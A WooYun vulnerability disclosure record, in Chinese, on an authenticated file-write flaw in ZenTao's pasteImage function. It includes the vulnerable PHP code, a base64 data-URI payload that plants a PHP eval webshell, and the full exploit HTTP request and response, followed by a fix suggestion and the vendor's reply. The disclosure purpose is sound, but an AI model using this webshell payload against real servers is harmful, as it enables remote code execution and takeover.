{"id": 82273, "wybug_id": "wooyun-2015-0151565", "wybug_title": "禅道项目管理软件任意文件写入漏洞（需要登录）", "wybug_corp": "禅道", "wybug_author": "xiao.k", "wybug_date": "2015-11-04 10:06", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： Finger 问我禅道老版本的问题，我就稍微看了下老版本的代码。很巧的是又发现了一个漏洞。 详细说明：  ## 漏洞触发条件需要登录## 漏洞影响范围开源版 7.3,专业版4.7.1 以及之前版本## 漏洞代码分析关键代码在`\\module\\file\\model.php`，252-276行。\n/**     * Paste image in kindeditor at firefox and chrome.      *      * @param  string    $data      * @access public     * @return string     */    public function pasteImage($data)    {        $data = str_replace('\\\"', '\"', $data);        ini_set('pcre.backtrack_limit', strlen($data));        preg_match_all('/<img src=\"(data:image\\/(\\S+);base64,(\\S+))\".*\\/>/U', $data, $out);        foreach($out[3] as $key => $base64Image)        {            $imageData = base64_decode($base64Image); //解密文加内容            $file['extension'] = $out[2][$key]; //文件后置            $file['pathname']  = $this->setPathName($key, $file['extension']); //文件名            $file['size']      = strlen($imageData);            $file['addedBy']   = $this->app->user->account;            $file['addedDate'] = helper::today();            $file['title']     = basename($file['pathname']);            file_put_contents($this->savePath . $file['pathname'], $imageData); //写入数据            $this->dao->insert(TABLE_FILE)->data($file)->exec();            $data = str_replace($out[1][$key], $this->webPath . $file['pathname'], $data);        }        return $data;    }\n程序会提取data中的内容，经过base64_decode然后写入到文件中。文件的后缀来自image/后分号之前的内容。我们的data内容构造如下：\n<img src=\"data:image/php;base64,PD9waHAgZXZhbCgkX1BPU1RbdG1kXSk/Pg==\"      />\nPD9waHAgZXZhbCgkX1BPU1RbdG1kXSk/Pg== 实际内容为 <?php eval($_POST[tmd])?>。为了满足正则表达式，引号之后要多加几个空格。完整的数据包如下：\nPOST /official/ZenTaoPMS.Pro4.7.1/zentaopms/www/file-ajaxPasteImage.html HTTP/1.1\tHost: **.**.**.**\tProxy-Connection: keep-alive\tCache-Control: max-age=0\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\tUpgrade-Insecure-Requests: 1\tUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36\tDNT: 1\tReferer: http://**.**.**.**/official/ZenTaoPMS.5.3.stable/zentaopms/www/my/\tAccept-Encoding: gzip, deflate, sdch\tAccept-Language: zh-CN,zh;q=0.8,en;q=0.6\tCookie: sid=u678s5mfdlk02hh35o3lldmpf1\tContent-Length: 84\tContent-Type: application/x-www-form-urlencoded\t\teditor=<img src=\"data:image/php;base64,PD9waHAgZXZhbCgkX1BPU1RbdG1kXSk/Pg==\"      />\n返回\nHTTP/1.1 200 OKDate: Tue, 03 Nov 2015 10:38:08 GMTServer: Apache/2.4.12X-Powered-By: PHP/5.6.6Set-Cookie: lang=zh-cn; expires=Thu, 03-Dec-2015 10:38:08 GMT; Max-Age=2592000; path=/official/ZenTaoPMS.Pro4.7.1/zentaopms/www/Set-Cookie: theme=default; expires=Thu, 03-Dec-2015 10:38:08 GMT; Max-Age=2592000; path=/official/ZenTaoPMS.Pro4.7.1/zentaopms/www/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: privatePragma: no-cacheVary: Accept-Encoding,User-AgentContent-Length: 103Content-Type: text/html; Language=UTF-8;charset=UTF-8<img src=\"/official/ZenTaoPMS.Pro4.7.1/zentaopms/www/data/upload/1/201511/0318380808104ldm.php\"      />\n   漏洞证明：  \n\n   修复方案：  写的时候，检验下文件的后缀。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-04 11:15 厂商回复： 谢谢反馈。这个问题和之前另外一个白帽子的是一个问题。近期会发布一个版本解决下。其实禅道都是内部使用的，还有之前很多黑帽子说的我们可以直接创建php文件的问题，那其实都是禅道自身的功能。安全和使用方便还是要做一个平衡吧。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-04 10:07 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:754 漏洞数:116        | ®高级安全工程师 | WooYun认证√)\t\t \n  sofa    \n     2015-11-04 10:20 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  大早上就看到惊喜，哈哈。    \n     2015-11-04 11:21 |    \t\txiao.k \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:16        | 纳威网络安全导航 navisec.it)\t\t \n  前排找工作，求各路大牛收留    \n     2015-11-04 11:26 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:754 漏洞数:116        | ®高级安全工程师 | WooYun认证√)\t\t \n  @xiao.k http://job.wooyun.org/    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}